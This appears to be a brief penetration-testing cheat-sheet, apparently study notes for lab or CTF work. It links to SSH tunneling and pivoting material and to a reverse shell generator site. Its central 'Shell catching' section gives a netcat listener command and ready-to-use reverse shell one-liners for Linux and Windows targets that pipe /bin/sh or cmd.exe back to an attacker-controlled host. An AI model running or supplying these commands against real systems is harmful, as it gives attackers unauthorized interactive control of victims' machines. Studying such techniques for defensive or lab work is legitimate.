# Misc: References, and other stuff

excellent summary of SSH tunneling [here](https://tryhackme.com/room/lateralmovementandpivoting)



## Shell catching, and stabilization

set up listener with: 
```
nc –nvlp ${LPORT} 
```

now, from our Linux target box we can do:

```
nc $LHOST $LPORT -e /bin/sh
```
or Windows:

```
nc.exe $LHOST $LPORT -e cmd.exe
```
Afterwards, stabilize with [this](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal)

## Revshells

[revshells.com](https://www.revshells.com/)
